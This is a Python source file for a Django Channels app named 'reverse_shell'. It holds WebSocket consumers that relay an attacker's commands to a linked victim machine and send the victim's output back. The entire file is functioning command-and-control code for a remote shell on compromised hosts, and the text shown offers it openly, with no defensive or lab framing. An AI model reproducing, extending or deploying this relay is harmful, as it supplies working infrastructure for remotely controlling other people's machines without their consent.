import json
from channels.layers import get_channel_layer
from channels.db import database_sync_to_async
from reverse_shell.models import Attacker, Victim
from channels.generic.websocket import AsyncWebsocketConsumer


class AttackerConsumer(AsyncWebsocketConsumer):
    async def connect(self):
        user = self.scope['user']
        await self.set_channel_name(user)
        await self.accept()

    async def disconnect(self, close_code):
        # Update the attacker's victim field to None.
        user = self.scope['user']
        await self.update_attacker(user)

    # Receive message from WebSocket
    async def receive(self, text_data):
        user = self.scope['user']
        text_data_json = json.loads(text_data)
        channel_name = await self.get_victim_channel_name(user)
        channel_layer = get_channel_layer()
        await channel_layer.send(channel_name, {'type': 'command', 'message': text_data_json['message']})

    async def display(self, event):
        # Send message to WebSocket
        await self.send(text_data=json.dumps({'message': event['message']}))

    @database_sync_to_async
    def set_channel_name(self, user):
        attacker = Attacker.objects.get(owner=user)
        attacker.channel_name = self.channel_name
        attacker.save()

    @database_sync_to_async
    def get_victim_channel_name(self, user):
        attacker = Attacker.objects.get(owner=user)
        victim = attacker.victim
        channel_name = victim.channel_name
        return channel_name

    @database_sync_to_async
    def update_attacker(self, user):
        attacker = Attacker.objects.get(owner=user)
        attacker.victim = None
        attacker.save()


class VictimConsumer(AsyncWebsocketConsumer):
    async def connect(self):
        user = self.scope['user']
        await self.set_channel_name(user)
        await self.accept()

    async def disconnect(self, close_code):
        # Update the victim's logged_in field to False and attacker field to None.
        user = self.scope['user']
        await self.update_victim(user)

    # Receive message from WebSocket
    async def receive(self, text_data):
        user = self.scope['user']
        text_data_json = json.loads(text_data)
        channel_name = await self.get_attacker_channel_name(user)
        channel_layer = get_channel_layer()
        await channel_layer.send(channel_name, {'type': 'display', 'message': text_data_json['message']})

    async def command(self, event):
        # Send message to WebSocket
        await self.send(text_data=json.dumps({'message': event['message']}))

    @database_sync_to_async
    def set_channel_name(self, user):
        victim = Victim.objects.get(owner=user)
        victim.channel_name = self.channel_name
        victim.save()

    @database_sync_to_async
    def get_attacker_channel_name(self, user):
        attacker = Attacker.objects.get(victim__owner=user)
        channel_name = attacker.channel_name
        return channel_name

    @database_sync_to_async
    def update_victim(self, user):
        victim = Victim.objects.get(owner=user)
        victim.logged_in = False
        victim.attacker = None
        victim.save()
